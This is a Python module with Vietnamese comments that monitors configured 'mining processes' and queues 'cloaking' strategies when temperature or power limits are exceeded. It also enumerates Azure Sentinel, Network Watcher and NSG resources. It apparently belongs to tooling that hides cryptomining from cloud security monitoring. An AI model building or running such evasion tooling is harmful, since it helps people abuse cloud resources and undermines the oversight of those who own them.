# resource_manager.py

import logging
import psutil
import pynvml
import traceback
import asyncio
from asyncio import Queue as AsyncQueue, Event
from typing import List, Any, Dict, Optional, Tuple
from itertools import count
from contextlib import asynccontextmanager

import aiofiles
import aiorwlock


from .utils import MiningProcess
from .cloak_strategies import CloakStrategyFactory
from .resource_control import ResourceControlFactory

from .azure_clients import (
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureNetworkWatcherClient,
    AzureAnomalyDetectorClient
)

from .auxiliary_modules.interfaces import IResourceManager
from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .auxiliary_modules import temperature_monitor
from .auxiliary_modules.power_management import (
    PowerManager,
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)

###############################################################################
#                        HÀM HỖ TRỢ CHIẾM KHÓA (LOCK) W/ TIMEOUT             #
###############################################################################


@asynccontextmanager
async def acquire_lock_with_timeout(lock, lock_type: str, timeout: float, retries: int = 3):
    if lock_type == 'read':
        lock_to_acquire = lock.reader_lock
    elif lock_type == 'write':
        lock_to_acquire = lock.writer_lock
    else:
        raise ValueError("lock_type phải là 'read' hoặc 'write'.")

    acquired = False
    for attempt in range(retries):
        try:
            await asyncio.wait_for(lock_to_acquire.acquire(), timeout=timeout)
            acquired = True
            break
        except asyncio.TimeoutError:
            logging.warning(f"Timeout khi chiếm lock {lock_type}, thử lại ({attempt + 1}/{retries}).")

    if not acquired:
        logging.error(f"Không thể chiếm lock {lock_type} sau {retries} lần thử.")
        yield None
        return

    try:
        yield lock_to_acquire
    finally:
        if hasattr(lock_to_acquire, "locked") and lock_to_acquire.locked():
            await lock_to_acquire.release()


###############################################################################
#              LỚP QUẢN LÝ TÀI NGUYÊN DÙNG CHUNG: SharedResourceManager       #
###############################################################################

class SharedResourceManager:
    """
    Quản lý tài nguyên chung (CPU, RAM, GPU, Disk, Network...).
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = logger
        # Tăng cường log khi bắt đầu khởi tạo
        self.logger.info("Khởi tạo SharedResourceManager... (BẮT ĐẦU)")

        try:
            self.config = config
            self.resource_managers = resource_managers
            self.power_manager = PowerManager()
            self.strategy_cache = {}

            # Log resource_managers nội bộ
            self.logger.debug(f"SharedResourceManager: resource_managers={self.resource_managers}")

            # Khởi tạo NVML
            self._nvml_init = False  # Trạng thái khởi tạo NVML
            self.logger.debug("SharedResourceManager: Gọi self.initialize_nvml()")
            self.initialize_nvml()
            self.logger.info("SharedResourceManager đã được khởi tạo thành công.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi tạo SharedResourceManager: {e}\n{traceback.format_exc()}")
            raise RuntimeError("Không thể khởi tạo SharedResourceManager.") from e
        finally:
            self.logger.info("Khởi tạo SharedResourceManager... (KẾT THÚC)")

    def is_nvml_initialized(self) -> bool:
        """Kiểm tra pynvml đã khởi tạo hay chưa."""
        return self._nvml_init

    def initialize_nvml(self):
        """Khởi tạo pynvml (NVML) nếu chưa có."""
        if not self._nvml_init:
            try:
                pynvml.nvmlInit()
                self._nvml_init = True
                self.logger.info("NVML đã được khởi tạo thành công.")
            except pynvml.NVMLError_LibraryNotFound:
                self.logger.error("Thư viện NVML không tìm thấy. Vui lòng kiểm tra container.")
                raise
            except pynvml.NVMLError_InsufficientPermissions:
                self.logger.error("Không đủ quyền truy cập NVML. Kiểm tra quyền GPU.")
                raise
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi NVML không xác định: {e}")
                raise

    async def shutdown_nvml(self):
        """Đóng NVML khi dừng toàn bộ hệ thống."""
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.debug("Đã shutdown NVML thành công.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi khi shutdown NVML: {e}")

    ##########################################################################
    #                     HÀM LẤY THÔNG TIN USAGE (ASYNC)                    #
    ##########################################################################

    async def get_process_cache_usage(self, pid: int) -> float:
        """
        Lấy usage cache của tiến trình từ /proc/[pid]/status (bất đồng bộ).
        """
        try:
            status_file = f"/proc/{pid}/status"
            async with aiofiles.open(status_file, 'r') as f:
                async for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
            return 0.0

    async def get_gpu_usage_percent(self, pid: int) -> float:
        """
        Lấy tỉ lệ sử dụng GPU của tiến trình dựa trên PID (bất đồng bộ).
        """
        try:
            loop = asyncio.get_event_loop()
            gpu_usage = await loop.run_in_executor(None, self._sync_get_gpu_usage_percent, pid)
            self.logger.debug(f"PID={pid} GPU usage: {gpu_usage}%")
            return gpu_usage
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """
        Hàm đồng bộ để lấy GPU usage, được gọi từ async context.
        Đảm bảo NVMLInit chỉ thực hiện 1 lần, không shutdown ngay tại đây.
        """
        try:
            if not self.is_nvml_initialized():
                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init, tiến hành init.")
                self.initialize_nvml()

            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu

            # Nếu tiến trình có mặt trên GPU => trả về tổng GPU usage
            return total_gpu_usage if gpu_present else 0.0

        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    ##########################################################################
    #                   ÁP DỤNG VÀ KHÔI PHỤC CHIẾN LƯỢC CLOAKING             #
    ##########################################################################

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng một chiến lược cloaking cho tiến trình.
        """
        try:
            pid = process.pid
            name = process.name

            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )

            if not strategy or not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
                return

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    async def restore_resources(self, process: MiningProcess):
        """
        Khôi phục tài nguyên cho tiến trình đã cloaked.
        """
        try:
            pid = process.pid
            name = process.name
            restored = False

            for controller_name, manager in self.resource_managers.items():
                success = await manager.restore_resources(pid)  # Trực tiếp await phương thức async
                if success:
                    self.logger.info(f"Đã khôi phục tài nguyên '{controller_name}' cho PID={pid}.")
                    restored = True
                else:
                    self.logger.error(f"Không thể khôi phục tài nguyên '{controller_name}' cho PID={pid}.")

            if restored:
                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
            else:
                self.logger.warning(f"Không tìm thấy tài nguyên nào cần khôi phục cho {name} (PID={pid}).")

        except psutil.NoSuchProcess:
            self.logger.error(f"Tiến trình PID={process.pid} không tồn tại khi khôi phục tài nguyên.")
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền khôi phục tài nguyên cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục tài nguyên cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

###############################################################################
#                  LỚP ResourceManager (SINGLETON) CHÍNH                      #
###############################################################################

class ResourceManager(IResourceManager):
    """
    Lớp quản lý tài nguyên hệ thống, giám sát và điều chỉnh tài nguyên
    cho các tiến trình khai thác (CPU, RAM, GPU, Disk, Network...).
    Áp dụng mô hình event-driven (watcher).
    """

    _instance = None
    _instance_lock = asyncio.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        if not hasattr(cls, '_instance') or cls._instance is None:
            cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        # Thêm check để tránh init nhiều lần
        if hasattr(self, '_initialized') and self._initialized:
            return

        self._initialized = True
        self.logger = logger

        # Logging chi tiết khi bắt đầu init
        self.logger.info("ResourceManager.__init__ (BẮT ĐẦU)")

        try:
            self.config = config
            self.event_bus = event_bus

            # Biến dừng
            self.stop_event = asyncio.Event()

            # Lock và queue cho sự kiện cloaking/restoration
            self.resource_lock = aiorwlock.RWLock()
            self.resource_adjustment_queue = AsyncQueue()

            # Danh sách tiến trình khai thác
            self.mining_processes: List[MiningProcess] = []
            self.mining_processes_lock = aiorwlock.RWLock()

            # Dùng để sắp xếp thứ tự ưu tiên
            self._counter = count()
            self.watchers = []

            # Đặt trạng thái khởi tạo của SharedResourceManager thành None
            self.shared_resource_manager: Optional[SharedResourceManager] = None

            self.logger.debug("ResourceManager.__init__: Đăng ký lắng nghe sự kiện 'resource_adjustment'")
            self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)

            self.logger.info("ResourceManager.__init__ (KẾT THÚC)")
        except Exception as e:
            self.logger.error(f"Lỗi trong ResourceManager.__init__: {e}\n{traceback.format_exc()}")
            raise RuntimeError("Không thể khởi tạo ResourceManager.") from e

    async def start(self):
        """
        Khởi động ResourceManager.
        """
        self.logger.info("ResourceManager.start() - BẮT ĐẦU")
        try:
            # Tăng cường log chi tiết
            self.logger.info("ResourceManager.start() - Tạo resource_managers từ ResourceControlFactory...")
            resource_managers = await ResourceControlFactory.create_resource_managers(config=self.config, logger=self.logger)
            self.logger.debug(f"ResourceControlFactory.create_resource_managers trả về: {resource_managers}")

            self.logger.info("ResourceManager.start() - Đã gọi create_resource_managers xong.")

            if not resource_managers:
                self.logger.error("Không thể tạo ResourceControlFactory managers (trả về None hoặc rỗng).")
                raise RuntimeError("Không thể tạo ResourceControlFactory managers (trả về None hoặc rỗng).")

            self.logger.info("ResourceManager.start() - Khởi tạo SharedResourceManager...")
            self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
            if self.shared_resource_manager is None:
                self.logger.error("SharedResourceManager không được khởi tạo.")
                raise RuntimeError("SharedResourceManager không được khởi tạo.")
            self.logger.info("ResourceManager.start() - Đã khởi tạo SharedResourceManager xong.")

            self.logger.info("ResourceManager.start() - Gọi initialize_azure_clients()...")
            self.initialize_azure_clients()
            self.logger.info("ResourceManager.start() - Đã initialize_azure_clients xong.")

            self.logger.info("ResourceManager.start() - Khám phá tài nguyên Azure...")
            await self.discover_azure_resources()
            self.logger.info("ResourceManager.start() - Đã khám phá tài nguyên Azure xong.")

            self.logger.info("ResourceManager.start() - Bắt đầu khởi tạo watchers...")
            await self.start_watchers()
            self.logger.info("ResourceManager.start() - Hoàn tất khởi tạo watchers.")

            self.logger.info("ResourceManager đã khởi động thành công.")
            self.logger.info("ResourceManager.start() - KẾT THÚC")

        except Exception as e:
            self.logger.error(f"Lỗi khi khởi động ResourceManager: {e}\n{traceback.format_exc()}")
            await self.shutdown()  # shutdown nếu lỗi
            raise

    def initialize_azure_clients(self):
        """Khởi tạo các client tương tác với Azure."""
        self.logger.debug("ResourceManager.initialize_azure_clients: Bắt đầu tạo Azure Clients.")
        try:
            # Khởi tạo các client Azure với cấu hình đã chuyển đổi thành dict
            self.azure_sentinel_client = AzureSentinelClient(self.logger)
            self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
            self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
            
            # Chuyển self.config thành dict trước khi truyền vào client
            self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config.to_dict())
            
            self.logger.debug("ResourceManager.initialize_azure_clients: Tạo Azure Clients thành công.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi tạo Azure Clients: {e}\n{traceback.format_exc()}")
            raise

    async def discover_azure_resources(self):
        """Khám phá tài nguyên Azure (Network Watchers, NSGs...)."""
        try:
            self.logger.debug("ResourceManager.discover_azure_resources: Khám phá Network Watchers.")
            self.network_watchers = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkWatchers'
            )
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.logger.debug("ResourceManager.discover_azure_resources: Khám phá NSGs.")
            self.nsgs = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkSecurityGroups'
            )
            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")

            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ (nếu có).")
        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    async def is_gpu_initialized(self) -> bool:
        """Kiểm tra NVML đã được khởi tạo hay chưa."""
        if self.shared_resource_manager:
            return self.shared_resource_manager.is_nvml_initialized()
        return False

    async def restore_resources(self, process: MiningProcess) -> bool:
        """Triển khai phương thức từ IResourceManager, gọi SharedResourceManager."""
        try:
            await self.shared_resource_manager.restore_resources(process)
            return True
        except Exception as e:
            self.logger.error(f"Lỗi trong restore_resources PID={process.pid}: {e}\n{traceback.format_exc()}")
            return False

    async def discover_mining_processes_async(self):
        try:
            cpu_name = self.config.processes.get('CPU', '').lower()
            gpu_name = self.config.processes.get('GPU', '').lower()

            async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
                if write_lock is None:
                    self.logger.error("Timeout khi acquire lock để discover mining processes.")
                    return

                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        pname = proc.info['name'].lower()
                        if cpu_name in pname or gpu_name in pname:
                            prio = self.get_process_priority(proc.info['name'])
                            net_if = self.config.network_interface
                            mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
                            self.mining_processes.append(mining_proc)
                            self.logger.debug(f"Discovered mining process: {mining_proc}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")

        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes_async: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên (priority) dựa trên config.
        """
        priority_map = self.config.process_priority_map
        pri_val = priority_map.get(process_name.lower(), 1)
        if not isinstance(pri_val, int):
            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán = 1.")
            return 1
        return pri_val

    ##########################################################################
    #         PHƯƠNG THỨC MỚI: collect_metrics và collect_all_metrics #
    ##########################################################################


    async def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"PID={process.pid} không tồn tại.")
                return {}

            p_obj = psutil.Process(process.pid)
            cpu_pct = p_obj.cpu_percent(interval=1)
            mem_mb = p_obj.memory_info().rss / (1024**2)

            gpu_pct = 0.0
            if await self.is_gpu_initialized():
                gpu_pct = await self.shared_resource_manager.get_gpu_usage_percent(process.pid)

            disk_mbps = await temperature_monitor.get_current_disk_io_limit(process.pid)
            cache_l = await self.shared_resource_manager.get_process_cache_usage(process.pid)

            metrics = {
                'cpu_usage_percent': float(cpu_pct),
                'memory_usage_mb': float(mem_mb),
                'gpu_usage_percent': float(gpu_pct),
                'disk_io_mbps': float(disk_mbps),
                'cache_limit_percent': float(cache_l),
            }

            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
            return metrics

        except Exception as e:
            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}")
            return {}

    async def collect_all_metrics(self) -> Dict[str, Any]:
        """
        Thu thập metrics cho tất cả tiến trình khai thác.
        """
        metrics_data = {}
        try:
            async with acquire_lock_with_timeout(self.mining_processes_lock, 'write', timeout=5) as write_lock:
                if write_lock is None:  # Đúng là write_lock, không phải read_lock
                    self.logger.error("Timeout khi acquire lock để collect_all_metrics.")
                    return metrics_data

                # Tạo danh sách các task thu thập metrics
                tasks = [self.collect_metrics(proc) for proc in self.mining_processes]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                # Xử lý từng kết quả
                for proc, result in zip(self.mining_processes, results):
                    if isinstance(result, Exception):
                        self.logger.error(f"Lỗi khi thu thập metrics cho PID={proc.pid}: {result}")
                    elif isinstance(result, dict) and result:
                        metrics_data[str(proc.pid)] = result
                    else:
                        self.logger.warning(f"Không có metrics hợp lệ cho PID={proc.pid}")

                self.logger.debug(f"Dữ liệu metrics đã thu thập: {metrics_data}")

        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        return metrics_data

    ##########################################################################
    #                         HÀNG ĐỢI SỰ KIỆN CLOAK/RESTORE                 #
    ##########################################################################

    async def handle_resource_adjustment(self, task: Dict[str, Any]):
        """
        Xử lý các sự kiện điều chỉnh tài nguyên từ EventBus.
        """
        # Log rõ ràng khi nhận sự kiện
        try:
            await self.resource_adjustment_queue.put(task)
            self.logger.info(
                f"Đã nhận sự kiện điều chỉnh tài nguyên: {task['type']} "
                f"cho PID={task.get('process').pid if 'process' in task else 'N/A'}"
            )
        except Exception as e:
            self.logger.error(f"Lỗi khi handle_resource_adjustment: {e}\n{traceback.format_exc()}")

    async def enqueue_cloaking(self, process: MiningProcess):
        """Thêm vào queue để cloaking."""
        try:
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': ['cpu', 'gpu', 'cache', 'network', 'memory', 'disk_io']
            }
            # Cloaking ưu tiên cao (priority=1)
            priority = 1
            count_val = next(self._counter)
            await self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_restoration(self, process: MiningProcess):
        """Thêm vào queue để khôi phục."""
        try:
            task = {
                'type': 'restoration',
                'process': process
            }
            # Restoration ưu tiên thấp hơn (priority=2)
            priority = 2
            count_val = next(self._counter)
            await self.resource_adjustment_queue.put((priority, count_val, task))
            self.logger.info(f"Đã enqueue khôi phục tài nguyên cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                           PHÁT HIỆN BẤT THƯỜNG                          #
    ##########################################################################

    async def process_resource_adjustments(self):
        """
        Coroutine xử lý sự kiện cloaking/restoration từ resource_adjustment_queue.
        """
        while not self.stop_event.is_set():
            try:
                priority, count_val, task = await asyncio.wait_for(self.resource_adjustment_queue.get(), timeout=1)
                if task['type'] == 'cloaking':
                    for strategy in task['strategies']:
                        if strategy not in self.shared_resource_manager.strategy_cache:
                            strategy_instance = CloakStrategyFactory.create_strategy(
                                strategy,
                                self.config,
                                self.logger,
                                self.shared_resource_manager.resource_managers
                            )
                            self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
                            self.logger.debug(f"Created and cached strategy '{strategy}'.")

                        else:
                            strategy_instance = self.shared_resource_manager.strategy_cache[strategy]
                            self.logger.debug(f"Retrieved cached strategy '{strategy}'.")

                        if strategy_instance and callable(getattr(strategy_instance, 'apply', None)):
                            self.logger.info(f"Áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}.")
                            strategy_instance.apply(task['process'])
                            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy}' cho PID={task['process'].pid}.")
                        else:
                            self.logger.error(f"Không thể áp dụng strategy '{strategy}' cho PID={task['process'].pid}.")

                elif task['type'] == 'restoration':
                    self.logger.info(f"Đang khôi phục tài nguyên cho PID={task['process'].pid}.")
                    await self.shared_resource_manager.restore_resources(task['process'])
                    self.logger.info(f"Đã khôi phục tài nguyên cho PID={task['process'].pid}.")

                self.resource_adjustment_queue.task_done()

            except asyncio.TimeoutError:
                continue  # Nếu queue trống, chờ 1 giây rồi lặp
            except Exception as e:
                self.logger.error(f"Lỗi trong process_resource_adjustments: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                          WATCHERS: GIÁM SÁT NHIỆT ĐỘ, CÔNG SUẤT         #
    ##########################################################################


    async def temperature_watcher(self):
        mon_params = self.config.monitoring_parameters
        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
        temp_lims = self.config.temperature_limits
        cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
        gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)

        retry_delay = 1  # Độ trễ ban đầu khi retry
        while not self.stop_event.is_set():
            try:
                await self.discover_mining_processes_async()

                async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                    if read_lock is None:
                        self.logger.warning("Timeout khi lock mining_processes trong temperature_watcher.")
                        retry_delay = min(retry_delay * 2, 60)  # Tăng dần độ trễ, tối đa 60 giây
                        await asyncio.sleep(retry_delay)
                        continue

                    tasks = [
                        self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)
                        for proc in self.mining_processes
                    ]
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for result in results:
                        if isinstance(result, Exception):
                            self.logger.error(f"Lỗi trong task check_temperature_and_enqueue: {result}")

                    retry_delay = 1  # Reset độ trễ nếu thành công

            except asyncio.CancelledError:
                self.logger.info("Watcher bị hủy (temperature_watcher).")
                break
            except Exception as e:
                self.logger.error(f"Lỗi trong temperature_watcher: {e}\n{traceback.format_exc()}")
            await asyncio.sleep(temp_intv)

    async def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        try:
            cpu_temp = await temperature_monitor.get_cpu_temperature()
            gpu_temps = await temperature_monitor.get_gpu_temperature() if await self.is_gpu_initialized() else []

            # Kiểm tra kiểu và chuyển đổi nếu cần
            if not isinstance(gpu_temps, (list, tuple)):
                gpu_temps = [gpu_temps]

            if cpu_temp > cpu_max_temp:
                self.logger.warning(f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid}).")
                await self.enqueue_cloaking(process)

            if any(temp > gpu_max_temp for temp in gpu_temps):
                self.logger.warning(f"Nhiệt độ GPU {gpu_temps}°C > {gpu_max_temp}°C (PID={process.pid}).")
                await self.enqueue_cloaking(process)

        except Exception as e:
            self.logger.error(f"check_temperature_and_enqueue error PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def power_watcher(self):
        """
        Watcher giám sát công suất CPU/GPU. Nếu vượt ngưỡng => enqueue cloaking.
        """
        mon_params = self.config.monitoring_parameters
        power_intv = mon_params.get("power_monitoring_interval_seconds", 60)
        power_limits = self.config.power_limits
        per_dev_power = power_limits.get("per_device_power_watts", {})
        cpu_max_pwr = per_dev_power.get("cpu", 150)
        gpu_max_pwr = per_dev_power.get("gpu", 300)

        consecutive_errors = 0  # Đếm số lỗi liên tiếp

        while not self.stop_event.is_set():
            try:
                await self.discover_mining_processes_async()

                # Retry logic khi không acquire được lock
                acquired = False
                for _ in range(3):  # Thử tối đa 3 lần
                    async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                        if read_lock is not None:
                            acquired = True
                            break
                        else:
                            self.logger.warning("Retrying lock mining_processes trong power_watcher...")
                            await asyncio.sleep(1)  # Đợi trước khi thử lại

                if not acquired:
                    self.logger.error("Timeout khi lock mining_processes trong power_watcher sau 3 lần thử.")
                    continue  # Chuyển sang vòng lặp tiếp theo nếu không chiếm được khóa

                tasks = [
                    self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)
                    for proc in self.mining_processes
                ]

                # Sử dụng return_exceptions để xử lý từng task độc lập
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        self.logger.error(f"Lỗi trong task check_power_and_enqueue: {result}")

                # Reset đếm lỗi nếu thành công
                consecutive_errors = 0

            except asyncio.CancelledError:
                self.logger.info("Watcher bị hủy (power_watcher).")
                break
            except Exception as e:
                consecutive_errors += 1
                self.logger.error(f"Lỗi power_watcher: {e}\n{traceback.format_exc()}")

                # Nếu lỗi liên tiếp vượt ngưỡng, ghi log cảnh báo và tạm dừng
                if consecutive_errors >= 5:
                    self.logger.critical("Lỗi liên tiếp trong power_watcher, tạm dừng 60 giây.")
                    await asyncio.sleep(60)  # Tạm dừng watcher để giảm tải log và lỗi

            # Đợi trước khi lặp lại
            await asyncio.sleep(power_intv)

    async def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
        try:
            # Đảm bảo await các coroutine
            c_power = await asyncio.get_event_loop().run_in_executor(None, get_cpu_power, process.pid)
            g_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)

            # Xử lý GPU power (nếu là list)
            if isinstance(g_power, list):
                total_g_power = sum(g_power)
                if total_g_power > gpu_max_power:
                    self.logger.warning(f"GPU power={total_g_power}W > {gpu_max_power}W (PID={process.pid}).")
                    await self.enqueue_cloaking(process)
            elif g_power > gpu_max_power:
                self.logger.warning(f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid}).")
                await self.enqueue_cloaking(process)

            if c_power > cpu_max_power:
                self.logger.warning(f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid}).")
                await self.enqueue_cloaking(process)

        except Exception as e:
            self.logger.error(f"check_power_and_enqueue error PID={process.pid}: {e}\n{traceback.format_exc()}")


    ##########################################################################
    #               KHỞI TẠO WATCHERS & DỪNG ResourceManager                 #
    ##########################################################################

    async def start_watchers(self):
        """Khởi tạo watchers & queue consumer dưới dạng asyncio Task."""
        self.logger.debug("ResourceManager.start_watchers: Khởi tạo các watcher tasks.")
        try:
            self.watchers.append(asyncio.create_task(self.temperature_watcher()))
            self.watchers.append(asyncio.create_task(self.power_watcher()))
            self.watchers.append(asyncio.create_task(self.process_resource_adjustments()))
            self.logger.info("Đã khởi tạo watchers (temperature, power) và consumer hàng đợi.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi tạo watchers: {e}\n{traceback.format_exc()}")
            raise

    async def shutdown(self):
        """
        Dừng ResourceManager và giải phóng tài nguyên.
        """
        self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")
        self.stop_event.set()

        # Hủy các watchers
        for w in self.watchers:
            w.cancel()
        await asyncio.gather(*self.watchers, return_exceptions=True)

        # Đợi queue rỗng
        await asyncio.sleep(1)
        if self.shared_resource_manager:
            await self.shared_resource_manager.shutdown_nvml()

        # Khôi phục tài nguyên cho tất cả tiến trình (nếu cần)
        if self.shared_resource_manager:
            tasks = []
            async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
                if read_lock:
                    for proc in self.mining_processes:
                        tasks.append(self.shared_resource_manager.restore_resources(proc))
            await asyncio.gather(*tasks, return_exceptions=True)

        self.logger.info("ResourceManager đã dừng. (KẾT THÚC)")
